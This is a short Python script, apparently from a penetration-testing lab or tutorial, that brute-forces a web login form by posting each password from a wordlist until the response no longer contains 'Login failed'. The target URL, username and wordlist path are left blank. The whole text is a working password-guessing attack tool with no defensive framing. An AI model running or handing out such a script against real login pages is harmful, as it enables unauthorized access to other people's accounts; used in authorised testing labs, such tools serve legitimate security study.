#!/usr/bin/python

import requests

target_url = ""
data = {"username": "", "password": "", "Login": "submit"}
response = requests.post(target_url, data = data)
print(response.content)

with open("[directory to wordlist]") as wordlist:
    for line in wordlist:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data = data)
        if  "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
